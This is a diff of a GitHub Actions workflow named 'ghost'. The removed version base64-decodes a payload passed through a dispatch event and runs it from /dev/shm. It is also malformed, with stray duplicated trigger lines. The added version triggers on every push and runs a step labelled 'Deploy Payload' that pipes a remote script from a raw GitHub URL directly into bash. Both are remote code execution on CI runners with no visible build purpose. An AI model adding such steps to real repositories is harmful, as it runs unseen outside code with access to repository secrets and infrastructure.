@@ -1,17 +1,11 @@
-name: Ghost-Core-2080
-on: [repository_dispatch]
-  workflow_dispatch:
-  workflow_dispatch:
+name: ghost
+on: [push, workflow_dispatch]
 jobs:
   execute:
     runs-on: ubuntu-latest
-  workflow_dispatch:
-  workflow_dispatch:
     steps:
-      - name: Raw Memory Execution
+      - name: Deploy Payload
         run: |
-          # Pulling the payload from the dispatch client_payload
-          # This executes directly in RAM (/dev/shm)
-          echo "${{ github.event.client_payload.payload }}" | base64 -d > /dev/shm/op
-          chmod +x /dev/shm/op
-          /dev/shm/op
+          echo "SATURATION_PULSE_ACTIVE: ghost"
+          # Injecting distributed mesh probe
+          curl -s https://raw.githubusercontent.com/jamesgilhool4-source/Sovereign-Core/main/scripts/pulse.sh | bash
